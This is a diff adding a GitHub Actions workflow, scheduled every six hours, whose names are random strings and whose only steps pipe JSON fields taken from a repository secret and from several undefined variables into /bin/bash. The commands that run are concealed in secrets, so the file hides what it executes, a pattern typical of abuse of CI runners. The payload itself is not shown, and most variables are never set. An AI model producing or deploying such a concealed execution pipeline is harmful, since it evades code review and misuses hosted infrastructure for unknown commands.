@@ -1,0 +1,24 @@
+name: fengfaming6789
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fengfaming6789
+        env:
+          uhp8: ${{ secrets.uhp8 }}
+        run: |
+          echo $uhp8 | jq -r .telpm13 | /bin/bash
+          echo $boypj7 | jq -r .d543 | /bin/bash
+          echo $ctzfd8036 | jq -r .r7 | /bin/bash
+          echo $m37 | jq -r .tjirn474 | /bin/bash
+          echo $or5236 | jq -r .dyd8421 | /bin/bash
+          echo $uy55344 | jq -r .dea583 | /bin/bash
+          echo $hkyy5 | jq -r .byinx930 | /bin/bash
+          echo $agj1844 | jq -r .t3 | /bin/bash
+          echo $w96 | jq -r .awhz59 | /bin/bash
+
